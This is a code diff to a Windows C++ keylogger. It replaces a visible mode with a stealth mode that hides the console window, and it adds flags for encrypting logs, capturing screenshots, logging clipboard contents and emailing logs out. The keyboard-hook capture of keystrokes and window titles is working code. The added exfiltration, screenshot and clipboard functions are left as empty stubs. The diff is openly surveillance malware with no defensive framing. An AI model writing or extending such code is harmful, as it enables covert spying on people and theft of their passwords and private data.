@@ -13,16 +13,15 @@
 #pragma comment(lib, "wininet.lib")
 
 // Configuration Macro
-#define VISIBLE           // Uncomment for visible mode
-#define BOOT_WAIT         // Uncomment to enable boot-time waiting
-#define FORMAT 0          // 0: Default, 10: Decimal codes, 16: Hex codes
-#define IGNORE_MOUSE      // Uncomment to ignore mouse clicks
-#define EMAIL_SEND        // Uncomment to enable email sending
-#define LOG_INTERVAL 10   // Time in seconds to send logs via email
+#define STEALTH_MODE       // Uncomment for invisible mode
+#define ENCRYPT_LOGS       // Uncomment to enable log encryption
+#define SCREENSHOT_CAPTURE // Uncomment to enable screenshot capture
+#define CLIPBOARD_LOGGING  // Uncomment to enable clipboard logging
+#define EMAIL_SEND         // Uncomment to enable email sending
+#define LOG_INTERVAL 10    // Time in seconds to send logs via email
 #define LOG_FILE_SIZE 1024 // Max log file size (in KB) before sending
 
 // Key mapping for readable output
-#if FORMAT == 0
 const std::map<int, std::string> keyMapping{
     {VK_BACK, "[BACKSPACE]"}, {VK_RETURN, "\n"},   {VK_SPACE, " "}, 
     {VK_TAB, "[TAB]"},       {VK_SHIFT, "[SHIFT]"}, {VK_CONTROL, "[CONTROL]"}, 
@@ -32,7 +31,6 @@ const std::map<int, std::string> keyMapping{
     {VK_HOME, "[HOME]"},     {VK_OEM_PERIOD, "."}, {VK_ADD, "+"}, 
     {VK_SUBTRACT, "-"},      {VK_OEM_PLUS, "+"}, {VK_OEM_MINUS, "-"}
 };
-#endif
 
 HHOOK keyboardHook;
 std::ofstream outputFile;
@@ -55,6 +53,8 @@ void EncryptLogs(std::string& data);
 void SendLogs();
 void CheckLogSize();
 void EmailSender(const std::string& message);
+void CaptureScreenshot();
+void LogClipboardContent();
 
 // Hook callback function
 LRESULT CALLBACK HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
@@ -104,4 +104,83 @@ int LogKey(int keyStroke) {
             char timestamp[64];
             strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", &timeInfo);
 
-            logStream << "
+            logStream << "\n[" << timestamp << "] " << windowTitle << "\n";
+        }
+    }
+
+    if (keyMapping.find(keyStroke) != keyMapping.end()) {
+        logStream << keyMapping.at(keyStroke);
+    } else {
+        char key;
+        if (keyStroke >= 0x30 && keyStroke <= 0x39) {
+            key = keyStroke; // Number keys
+        } else if (keyStroke >= 0x41 && keyStroke <= 0x5A) {
+            key = keyStroke + 32; // Letter keys
+        } else {
+            key = static_cast<char>(MapVirtualKeyExA(keyStroke, MAPVK_VK_TO_CHAR, keyboardLayout));
+        }
+        logStream << key;
+    }
+
+    std::string logEntry = logStream.str();
+    logBuffer += logEntry;
+    outputFile << logEntry;
+    outputFile.flush();
+
+#ifdef ENCRYPT_LOGS
+    EncryptLogs(logBuffer);
+#endif
+
+#ifdef SCREENSHOT_CAPTURE
+    CaptureScreenshot();
+#endif
+
+#ifdef CLIPBOARD_LOGGING
+    LogClipboardContent();
+#endif
+
+    CheckLogSize();
+    return 0;
+}
+
+// Encrypt logs
+void EncryptLogs(std::string& data) {
+    // Implement encryption logic
+}
+
+// Send logs via email
+void SendLogs() {
+    // Implement email sending logic
+}
+
+// Check log file size and send if necessary
+void CheckLogSize() {
+    // Implement log file size check
+}
+
+// Capture screenshot
+void CaptureScreenshot() {
+    // Implement screenshot capture logic
+}
+
+// Log clipboard content
+void LogClipboardContent() {
+    // Implement clipboard logging logic
+}
+
+int main() {
+#ifdef STEALTH_MODE
+    ShowWindow(GetConsoleWindow(), SW_HIDE); // Hide console window
+#endif
+
+    outputFile.open("logs.txt", std::ios::app);
+    SetHook();
+    MSG msg;
+    while (GetMessage(&msg, NULL, 0, 0)) {
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
+    RemoveHook();
+    outputFile.close();
+    return 0;
+}
